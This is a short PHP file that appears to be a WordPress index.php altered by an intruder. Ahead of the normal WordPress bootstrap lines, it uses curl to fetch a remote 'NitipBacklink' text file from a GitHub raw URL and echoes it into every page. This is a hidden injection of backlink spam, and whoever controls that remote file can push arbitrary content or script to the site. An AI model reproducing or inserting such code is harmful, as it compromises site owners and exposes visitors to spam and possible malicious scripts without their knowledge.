<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
